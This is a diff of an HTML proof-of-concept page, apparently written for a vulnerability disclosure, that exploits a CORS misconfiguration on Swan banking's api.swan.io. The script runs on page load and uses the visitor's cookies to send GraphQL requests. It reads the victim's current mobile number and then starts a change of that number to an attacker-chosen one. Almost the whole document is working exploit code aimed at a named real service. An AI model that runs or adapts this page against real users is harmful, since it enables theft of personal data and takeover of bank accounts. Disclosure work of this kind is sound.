@@ -1,58 +1,66 @@
-<!DOCTYPE html>
-<meta charset="utf-8">
+<!DOCTYPE html><meta charset="utf-8">
 <title>Swan CORS Critical PoC</title>
 <style>
  body{font-family:system-ui;margin:2rem;color:#111}
  pre{background:#f8f8f8;padding:1rem;border:1px solid #e1e1e1;overflow:auto}
- .good{color:green}.bad{color:#c00}
+ code{color:#c7254e;background:#f9f2f4}
 </style>
 
 <h2>⚠️ Swan Banking – Critical CORS Misconfiguration PoC ⚠️</h2>
-<p>This page is served from <strong><span id="origin"></span></strong>.
-If your browser already holds <code>api.swan.io</code> cookies, the
-cross-origin requests below <em>automatically</em> include them – no JWT,
-no X-Swan-Authenticator-Token – because the server reflects every
-<code>Origin</code> and sets
-<code>Access-Control-Allow-Credentials: true</code>.</p>
+<p>This page is hosted on <strong id="origin"></strong>.  
+If the browser already holds <code>api.swan.io</code> cookies, every request
+below runs automatically – no JWT, no
+<code>X-Swan-Authenticator-Token</code> – because
+<code>Access-Control-Allow-Origin</code> echoes any value and
+<code>Access-Control-Allow-Credentials: true</code> lets the browser
+forward cookies.</p>
 
-<h3>Results</h3>
-<pre id="log">Running…</pre>
+<h3>Live log</h3><pre id="log">Running…</pre>
 
 <script>
-const log = s => (document.getElementById('log').textContent += s + '\n');
+const log  = t => (document.getElementById('log').textContent += t + '\n');
 document.getElementById('origin').textContent = location.origin;
 
-// 1) Introspection
-fetch("https://api.swan.io/admin/graphql", {
-  method:"POST",
-  credentials:"include",
-  headers:{ "Content-Type":"application/json" },
-  body: JSON.stringify({query:`{ __schema { queryType { name } } }`})
-})
-.then(r => r.text().then(b => log(`=== /admin/graphql ===\nStatus: ${r.status} ${r.statusText}\n${b}\n`)));
+/* ---------------- helper ---------------- */
+async function gql(path, query){
+  const r = await fetch("https://api.swan.io"+path,{
+    method:"POST", credentials:"include",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({query})
+  });
+  const body = await r.text();
+  log(`=== ${path} ===\nStatus: ${r.status} ${r.statusText}\n${body}\n`);
+  return {status:r.status, body:JSON.parse(body)};
+}
 
-// 2) startPhoneNumberModification (attacker-chosen numbers)
-const oldN = "+33600000002", newN = "+33677777777";
-const mutation = `
-mutation {
-  startPhoneNumberModification(input:{
-    oldPhoneNumber:"${oldN}",
-    newPhoneNumber:"${newN}"
-  }) {
-    __typename
-    ... on StartPhoneNumberModificationSuccessPayload {
-      phoneNumberModification { id }
+/* ---------- 1) get victim’s current number (if cookie present) ---------- */
+let oldN = null;
+gql("/admin-auth/graphql","{ user { mobilePhoneNumber } }")
+.then(({status,body})=>{
+    if(status===200 && body.data && body.data.user){
+        oldN = body.data.user.mobilePhoneNumber;
+        log("[+] Victim’s current phone: "+oldN+"\n");
+    }else{
+        log("[!] Could not read phone – probably not logged in.\n    Falling back to dummy old number.\n");
+        oldN="+33600000002";
     }
-    ... on PhoneNumberModificationAlreadyExistsRejection { message }
-    ... on TooManyPhoneNumberModificationRejection { message }
-  }
-}`;
-fetch("https://api.swan.io/admin-auth/graphql", {
-  method:"POST",
-  credentials:"include",
-  headers:{ "Content-Type":"application/json" },
-  body: JSON.stringify({query:mutation})
-})
-.then(r => r.text().then(b => log(`=== /admin-auth/graphql ===\nStatus: ${r.status} ${r.statusText}\n${b}\n\n[+] Attempted new number: ${newN}`)))
-.catch(e => log(`Fetch error: ${e}`));
+
+    /* ---------- 2) queue phone-number change ---------- */
+    const rand = String(Math.floor(100000+Math.random()*900000));
+    const newN = "+3367"+rand;
+    const mutation=`mutation{
+      startPhoneNumberModification(input:{
+        oldPhoneNumber:"${oldN}",
+        newPhoneNumber:"${newN}"
+      }){
+        __typename
+        ... on StartPhoneNumberModificationSuccessPayload{
+          phoneNumberModification{ id }
+        }
+        ... on PhoneNumberModificationAlreadyExistsRejection{ message }
+        ... on TooManyPhoneNumberModificationRejection{ message }
+      }}`
+    return gql("/admin-auth/graphql",mutation)
+           .then(()=>log("[+] Attempted new number: "+newN));
+});
 </script>
